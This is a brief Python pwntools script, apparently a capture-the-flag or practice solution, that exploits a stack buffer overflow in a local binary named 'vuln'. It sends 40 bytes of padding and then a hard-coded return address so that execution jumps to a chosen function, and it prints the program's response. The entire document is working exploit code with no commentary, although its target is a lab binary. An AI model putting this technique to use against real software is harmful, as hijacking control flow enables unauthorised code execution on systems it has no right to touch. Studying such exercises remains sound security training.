from pwn import *

p = process('./vuln')
print p.recvuntil('Input: ')
padding = 'a'*40
# addr = p64(0x0000555555555175)
addr = '\x75\x51\x55\x55\x55\x55'
send = padding + addr
print addr
print send
p.send(send)
print p.recv()
